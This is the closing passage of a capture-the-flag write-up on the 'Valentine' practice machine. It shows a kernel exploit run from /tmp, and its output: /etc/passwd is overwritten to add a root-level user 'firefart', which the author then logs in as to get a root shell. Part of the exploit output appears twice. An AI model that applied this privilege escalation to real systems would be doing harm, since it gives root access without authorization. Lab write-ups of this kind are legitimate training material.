c: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x937c2db535a9f60590676e928521f13a7f2280bf, not stripped
hype@Valentine:~/tmp$ chmod +x c
```

The only thing left is to run the exploit:

```bash
hype@Valentine:~/tmp$ ./c
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash

mmap: 7f1a74fd1000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'password123'.

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'password123'.

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

I need to enter a new root password, which I set to `password123`. I can then login as the user firefart (which was generated by the kernel exploit), which has sudo rights:

```bash
hype@Valentine:~/tmp$ su firefart
Password: 
firefart@Valentine:/home/hype/tmp# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@Valentine:/home/hype/tmp# ls /root/
curl.sh  root.txt
```

So both ways to escalate the privileges worked. I was a little worried about the kernel exploit that it will crash the system. This was the reason why I tried it after the tmux vulnerability.

# Conclusion

---

This box was pretty interesting and helped me a lot for my OSCP studies. There were a lot of things that I learned because I had to look it up in the internet, like how to exactly use the Heartbleed exploit to gain initial access to the machine.